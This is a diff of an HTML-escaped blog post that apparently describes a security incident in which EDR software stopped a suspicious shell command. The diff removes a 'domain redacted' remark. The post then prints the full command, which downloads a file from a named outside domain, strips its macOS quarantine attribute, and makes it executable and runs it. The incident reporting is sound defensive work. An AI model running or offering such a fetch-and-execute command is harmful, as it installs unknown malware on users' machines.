@@ -22,7 +22,7 @@
 &lt;blockquote&gt;
 &lt;p&gt;A suspicious Unix shell command was run, we killed the process but y&amp;rsquo;all might have a problem anyway&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;The actual command pasted was as follows (domain redacted):&lt;/p&gt;
+&lt;p&gt;The actual command pasted was as follows:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;/bin/bash -c &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;#!/bin/bash curl -o /tmp/update https://raytherrien.com/n8n/update \&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt; &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; xattr -c /tmp/update &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; chmod +x /tmp/update &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; /tmp/update
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Suspicious, indeed. Shoutout to Crowdstrike EDR for stopping this thing in its tracks &amp;ndash; we were, in fact, fine.
